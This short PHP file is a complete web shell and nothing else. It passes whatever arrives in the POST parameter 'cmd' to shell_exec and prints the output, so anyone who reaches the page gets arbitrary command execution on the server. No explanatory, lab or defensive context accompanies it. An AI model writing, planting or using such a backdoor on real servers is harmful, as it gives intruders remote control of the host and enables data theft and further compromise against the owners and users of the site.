<?php
if(isset($_POST['cmd'])){
	$output = shell_exec($_POST['cmd']);
	echo "<pre>$output</pre>";
}
?>
